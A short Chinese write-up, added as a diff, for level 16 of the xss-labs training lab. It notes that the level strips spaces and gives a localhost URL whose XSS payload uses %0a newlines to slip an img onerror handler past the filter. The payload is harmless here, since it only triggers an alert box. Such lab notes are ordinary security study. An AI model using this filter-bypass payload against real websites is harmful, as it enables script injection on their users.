@@ -1,0 +1,10 @@
+第16关
+
+这关注释了空格
+
+利用%0a代替
+
+http://localhost/xss-labs/level16.php?keyword=<img%0asrc=1%0aonerror=alert(1)>
+
+
+弹窗成功！！！
